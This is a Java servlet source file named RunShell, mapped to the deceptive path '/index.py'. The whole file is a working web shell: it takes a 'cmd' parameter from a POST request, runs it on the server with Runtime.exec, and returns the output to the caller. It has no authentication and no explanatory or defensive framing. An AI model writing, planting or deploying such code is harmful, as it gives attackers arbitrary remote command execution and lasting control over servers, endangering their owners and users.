package com.servlet;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList; 
import java.util.List; 
import javax.servlet.ServletException; 
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet; 
import javax.servlet.http.HttpServletRequest; 
import javax.servlet.http.HttpServletResponse;
@WebServlet("/index.py") 
public class RunShell extends HttpServlet{
@Override 
protected void doPost(HttpServletRequest req, HttpServletResponse resp)
throws ServletException, IOException{
// TODO Auto-generated method stub 
//  super.doGet(req, resp);
String cmd = req.getParameter("cmd"); 
System.out.println(cmd); 
Process process = null; 
List<String> processList = new ArrayList<String>(); 
try { 
if (cmd!=null) { 
process = Runtime.getRuntime().exec(cmd); 
BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream())); 
String line = ""; 
while ((line = input.readLine()) != null) { 
processList.add(line); 
} 
input.close(); 
} 
} catch (IOException e) { 
e.printStackTrace(); 
} 
String s = ""; 
for (String line : processList) {
//            System.out.println(line);  
s += line + "\n"; 
} 
if (s.equals("")) {
resp.getOutputStream().write("null".getBytes()); 
}else { 
resp.getOutputStream().write(s.getBytes()); 
} 
} 
}
